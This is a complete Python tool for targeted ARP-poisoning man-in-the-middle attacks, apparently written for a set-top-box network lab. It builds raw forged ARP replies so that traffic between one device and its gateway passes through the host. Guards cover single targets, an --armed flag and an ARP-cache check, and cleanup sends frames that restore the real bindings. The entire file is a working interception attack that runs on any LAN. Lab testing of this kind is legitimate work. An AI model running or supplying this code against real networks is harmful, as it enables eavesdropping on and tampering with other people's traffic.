#!/usr/bin/env python3
"""
Targeted ARP MITM helper for mero-stb-lab network experiments.

SAFETY INVARIANTS
-----------------
- Exactly ONE STB IPv4 target is accepted. Ranges/lists are rejected.
- The target must not be the host or the gateway.
- The configured MACs are sanity-checked against the local ARP cache.
- Cleanup restores only the real STB<->gateway pair.

This tool intentionally refuses the old NET-CONFIG-005 behaviour that poisoned
an entire DHCP range and then restored every address to the STB MAC.
"""

from __future__ import annotations

import argparse
import fcntl
import ipaddress
import signal
import socket
import struct
import sys
import time
from pathlib import Path

SIOCGIFADDR = 0x8915


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser()
    p.add_argument("iface")
    p.add_argument("target_ip", help="exact STB IPv4 address; ranges/lists are forbidden")
    p.add_argument("target_mac")
    p.add_argument("gateway_ip")
    p.add_argument("gateway_mac")
    p.add_argument(
        "--armed",
        action="store_true",
        help="required acknowledgement that this is a live MITM operation",
    )
    return p.parse_args()


def mac_bytes(value: str) -> bytes:
    raw = value.replace(":", "").replace("-", "")
    if len(raw) != 12:
        raise ValueError(f"invalid MAC address: {value}")
    return bytes.fromhex(raw)


def normalize_mac(value: str) -> str:
    return ":".join(f"{b:02x}" for b in mac_bytes(value))


def get_iface_mac(ifname: str) -> bytes:
    with open(f"/sys/class/net/{ifname}/address", encoding="ascii") as f:
        return mac_bytes(f.read().strip())


def get_iface_ipv4(ifname: str) -> ipaddress.IPv4Address | None:
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        packed = fcntl.ioctl(
            sock.fileno(),
            SIOCGIFADDR,
            struct.pack("256s", ifname.encode("utf-8")[:15]),
        )
        return ipaddress.IPv4Address(socket.inet_ntoa(packed[20:24]))
    except OSError:
        return None
    finally:
        sock.close()


def arp_cache() -> dict[str, str]:
    path = Path("/proc/net/arp")
    if not path.exists():
        return {}
    rows: dict[str, str] = {}
    for line in path.read_text(encoding="ascii", errors="replace").splitlines()[1:]:
        cols = line.split()
        if len(cols) >= 6:
            rows[cols[0]] = cols[3].lower()
    return rows


def make_frame(src_mac: bytes, src_ip: bytes, dst_mac: bytes, dst_ip: bytes) -> bytes:
    eth = dst_mac + src_mac + struct.pack("!H", 0x0806)
    arp = (
        struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
        + src_mac
        + src_ip
        + dst_mac
        + dst_ip
    )
    return eth + arp


def fail(message: str) -> "NoReturn":
    print(f"[-] SAFETY ABORT: {message}", file=sys.stderr)
    raise SystemExit(2)


def main() -> int:
    args = parse_args()

    if not args.armed:
        fail("live ARP MITM requires explicit --armed")

    if any(ch in args.target_ip for ch in ",-/"):
        fail("target_ip must be one exact IPv4 address, never a range/list/CIDR")

    try:
        target_ip_obj = ipaddress.IPv4Address(args.target_ip)
        gateway_ip_obj = ipaddress.IPv4Address(args.gateway_ip)
        target_mac_str = normalize_mac(args.target_mac)
        gateway_mac_str = normalize_mac(args.gateway_mac)
    except (ipaddress.AddressValueError, ValueError) as exc:
        fail(str(exc))

    if target_ip_obj == gateway_ip_obj:
        fail("target IP equals gateway IP")

    host_ip = get_iface_ipv4(args.iface)
    host_mac = get_iface_mac(args.iface)
    host_mac_str = host_mac.hex(":")

    if host_ip is not None and target_ip_obj == host_ip:
        fail(f"target IP {target_ip_obj} is this host")
    if host_ip is not None and gateway_ip_obj == host_ip:
        fail(f"gateway IP {gateway_ip_obj} is this host")
    if target_mac_str == host_mac_str:
        fail("target MAC equals this host MAC")
    if gateway_mac_str == host_mac_str:
        fail("gateway MAC equals this host MAC")
    if target_mac_str == gateway_mac_str:
        fail("target MAC equals gateway MAC")

    cache = arp_cache()
    cached_target = cache.get(str(target_ip_obj))
    cached_gateway = cache.get(str(gateway_ip_obj))
    if cached_target and cached_target != target_mac_str:
        fail(
            f"ARP cache says {target_ip_obj} is {cached_target}, "
            f"not expected STB {target_mac_str}"
        )
    if cached_gateway and cached_gateway != gateway_mac_str:
        fail(
            f"ARP cache says {gateway_ip_obj} is {cached_gateway}, "
            f"not expected gateway {gateway_mac_str}"
        )

    target_ip = socket.inet_aton(str(target_ip_obj))
    gateway_ip = socket.inet_aton(str(gateway_ip_obj))
    target_mac = mac_bytes(target_mac_str)
    gateway_mac = mac_bytes(gateway_mac_str)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    sock.bind((args.iface, 0))

    # Poison only the two legitimate peers:
    #   STB: gateway IP -> host MAC
    #   gateway: STB IP -> host MAC
    poison_to_target = make_frame(host_mac, gateway_ip, target_mac, target_ip)
    poison_to_gateway = make_frame(host_mac, target_ip, gateway_mac, gateway_ip)

    # Restore the exact authentic bindings:
    #   STB: gateway IP -> gateway MAC
    #   gateway: STB IP -> STB MAC
    restore_to_target = make_frame(gateway_mac, gateway_ip, target_mac, target_ip)
    restore_to_gateway = make_frame(target_mac, target_ip, gateway_mac, gateway_ip)

    running = True

    def handle_exit(signum, frame):  # noqa: ARG001
        nonlocal running
        running = False

    signal.signal(signal.SIGINT, handle_exit)
    signal.signal(signal.SIGTERM, handle_exit)

    print(f"[*] Targeted ARP MITM armed on {args.iface}")
    print(f"[*] STB     {target_ip_obj} ({target_mac_str})")
    print(f"[*] Gateway {gateway_ip_obj} ({gateway_mac_str})")
    print(f"[*] Host    {host_ip or 'no IPv4'} ({host_mac_str})")

    try:
        while running:
            sock.send(poison_to_target)
            sock.send(poison_to_gateway)
            time.sleep(1.0)
    finally:
        print("[*] Restoring authentic STB<->gateway ARP bindings...")
        for _ in range(8):
            sock.send(restore_to_target)
            sock.send(restore_to_gateway)
            time.sleep(0.1)
        sock.close()
        print("[+] ARP restoration frames sent.")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
